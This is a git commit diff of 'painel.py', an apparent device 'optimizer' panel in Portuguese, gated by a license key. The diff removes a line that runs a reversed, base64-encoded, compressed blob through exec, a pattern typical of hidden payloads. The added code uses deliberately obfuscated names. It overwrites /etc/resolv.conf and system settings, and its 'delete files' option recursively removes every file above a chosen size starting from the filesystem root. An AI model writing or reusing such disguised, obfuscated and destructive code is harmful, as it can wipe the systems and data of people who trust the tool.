e79e54602000e8cd4be5c3f597ce56b6f7730afa
MaxDev <gostosokratz@gmail.com>
2025-05-08 15:15:51 -0300

    Update painel.py

--- painel.py
+++ painel.py
@@ -1,4 +1,112 @@
+lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl = input, int, Exception, exit, bool, print, open
 
+from json import load as IlIlIllIlIIIll
+from platform import machine as lIlIIIIllIIlll, version as IIIlIlIIIIIlll, system as lIlIlIIlllIIIl
+from os import geteuid as lIllIIllIlIIll, remove as IlIIIIlIIIIlll, walk as lllIlIIllllIll, system as IIIllIIIIlIIll
+from os.path import join as IlllIllIlIIlIl, getsize as IIllIlIlIllIlI
+from datetime import datetime as lIlIIIlllllllI, timedelta as llllIIlIIIlIII
 
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+def IlllllIIIllIlIIIlI():
+    try:
+        with llllllllllllIIl('keys.json', 'r') as IlIllllllIllIIIIll:
+            return IlIlIllIlIIIll(IlIllllllIllIIIIll)
+    except lllllllllllllIl as IlllIIlIllllIllIII:
+        llllllllllllIlI(f'Erro ao carregar keys: {IlllIIlIllllIllIII}')
+        return {}
+
+def lIlllllIIlIIIllIIl(llllIlllIIlIllllII):
+    IIllIIIlIlIlIIllII = IlllllIIIllIlIIIlI()
+    if llllIlllIIlIllllII not in IIllIIIlIlIlIIllII:
+        return llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
+    lIlIlIllIIIIIllIII = IIllIIIlIlIlIIllII[llllIlllIIlIllllII]['ativado_em']
+    IlIllllllIlIIIIIlI = IIllIIIlIlIlIIllII[llllIlllIIlIllllII]['tipo']
+    if IlIllllllIlIIIIIlI == '7d' and (lIlIIIlllllllI.now() - lIlIIIlllllllI.strptime(lIlIlIllIIIIIllIII, '%Y-%m-%d')).days > 7:
+        return llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
+    elif IlIllllllIlIIIIIlI == '30d' and (lIlIIIlllllllI.now() - lIlIIIlllllllI.strptime(lIlIlIllIIIIIllIII, '%Y-%m-%d')).days > 30:
+        return llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
+    elif IlIllllllIlIIIIIlI == 'inf':
+        return llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)
+    return llllllllllllIll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
+
+def IlIIllllllIIIlIlIl():
+    lIllIlIIIIIlIIIllI = IIIllIIIIlIIll()
+    IllIIllllIlIIllllI = IIIlIlIIIIIlll()
+    IlllIllIllIIIIlllI = lIlIIIIllIIlll()
+    return (lIllIlIIIIIlIIIllI, IllIIllllIlIIllllI, IlllIllIllIIIIlllI)
+
+def IllIIlllIIIlIIlIll():
+    IIIllIIIIlIIll('clear')
+    llllllllllllIlI("\n _   __  __                 ____          _______             _\n| | |  \\/  |               / __ \\        |__   __|           (_)\n| | | \\  / |  __ _ __  __ | |  | | _ __     | |    _ __ ___   _  ____  ___  _ __\n| | | |\\/| | / _` |\\ \\/ / | |  | || '_ \\    | |   | '_ ` _ \\ | ||_  / / _ \\| '__|\n|_| | |  | || (_| | >  <  | |__| || |_) |   | |   | | | | | || | / / |  __/| |\n(_) |_|  |_| \\__,_|/_/\\_\\  \\____/ | .__/    |_|   |_| |_| |_||_|/___| \\___||_|\n                                  | |\n                                  |_|\n    ")
+    (lIllIlIIIIIlIIIllI, IllIIllllIlIIllllI, IlllIllIllIIIIlllI) = IlIIllllllIIIlIlIl()
+    llllllllllllIlI(f'\nSeu Dispositivo: {IlllIllIllIIIIlllI}')
+    llllllllllllIlI(f'Versão do Sistema: {lIllIlIIIIIlIIIllI} {IllIIllllIlIIllllI}')
+    llllllllllllIlI(f"Root: {('Sim' if lIllIIllIlIIll() == 0 else 'Não')}\n")
+    llllllllllllIlI('1. Desempenhar Bateria')
+    llllllllllllIlI('2. Desempenhar Fps')
+    llllllllllllIlI('3. Dns Free')
+    llllllllllllIlI('4. Exit Lag')
+    llllllllllllIlI('5. Apagar Arquivos')
+    IIIlIIIllllIIIllIl = lllllllllllllll('Escolha uma opção: ')
+    if IIIlIIIllllIIIllIl == '1':
+        llIlllllIlIllIIIII()
+    elif IIIlIIIllllIIIllIl == '2':
+        lllIIlIIIIIIIlIlll()
+    elif IIIlIIIllllIIIllIl == '3':
+        IIIlIlIIIIIIlIIlll()
+    elif IIIlIIIllllIIIllIl == '4':
+        IIIlIIlIlIIllIllII()
+    elif IIIlIIIllllIIIllIl == '5':
+        IIIlIllllllllIlIll()
+    else:
+        llllllllllllIlI('Opção inválida!')
+
+def llIlllllIlIllIIIII():
+    llllllllllllIlI('Otimização da Bateria em andamento...')
+    IIIllIIIIlIIll('echo 1 > /sys/class/power_supply/battery/charge_control_limit')
+    llllllllllllIlI('Modo de bateria otimizado!')
+
+def lllIIlIIIIIIIlIlll():
+    llllllllllllIlI('Otimização do Fps em andamento...')
+    IIIllIIIIlIIll('echo performance > /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor')
+    llllllllllllIlI('FPS otimizado!')
+
+def IIIlIlIIIIIIlIIlll():
+    llllllllllllIlI('Configurando DNS Free...')
+    IIIllIIIIlIIll("echo 'nameserver 8.8.8.8' > /etc/resolv.conf")
+    llllllllllllIlI('DNS configurado para Google DNS (8.8.8.8)!')
+
+def IIIlIIlIlIIllIllII():
+    llllllllllllIlI('Reduzindo o Lag...')
+    IIIllIIIIlIIll('settings put global transition_animation_scale 0')
+    IIIllIIIIlIIll('settings put global animator_duration_scale 0')
+    IIIllIIIIlIIll('settings put global window_animation_scale 0')
+    llllllllllllIlI('Lag otimizado!')
+
+def IIIlIllllllllIlIll():
+    llIlllIIllIIlIlllI = lllllllllllllll('Digite o tamanho mínimo para apagar arquivos (em MB): ')
+    lIIIllIIlIllIlIIIl = llllllllllllllI(llIlllIIllIIlIlllI) * 1024 * 1024
+    llllllllllllIlI(f'Apagando arquivos com tamanho mínimo de {llIlllIIllIIlIlllI}MB...')
+    for (llIlllIllllIlIllII, IlIlIlIlllIlllllII, IlIIlllllIllIIIllI) in lllIlIIllllIll('/'):
+        for IIlIIlIIIIlllllIIl in IlIIlllllIllIIIllI:
+            lllIlIllIIllIIIlII = IlllIllIlIIlIl(llIlllIllllIlIllII, IIlIIlIIIIlllllIIl)
+            try:
+                IlIIllIIIlIlIIIIlI = IIllIlIlIllIlI(lllIlIllIIllIIIlII)
+                if IlIIllIIIlIlIIIIlI >= lIIIllIIlIllIlIIIl:
+                    IlIIIIlIIIIlll(lllIlIllIIllIIIlII)
+                    llllllllllllIlI(f'Arquivo {lllIlIllIIllIIIlII} apagado.')
+            except lllllllllllllIl as IlllIIlIllllIllIII:
+                pass
+
+def IllllllIlllIlIlIII():
+    llllllllllllIlI('\n\nCréditos:')
+    llllllllllllIlI('Desenvolvido por Max OpTmizer')
+    llllllllllllIlI('Agradecimentos ao GitHub e comunidade Python!')
+    llllllllllllIlI('E ao Python.org pela incrível biblioteca!')
+    llllllllllllIlI('Versão 1.0 - 2025')
+llllIlllIIlIllllII = lllllllllllllll('Digite sua key: ')
+if lIlllllIIlIIIllIIl(llllIlllIIlIllllII):
+    IllIIlllIIIlIIlIll()
+else:
+    llllllllllllIlI('Key inválida ou expirada!')
+    lllllllllllllII()
+IllllllIlllIlIlIII()
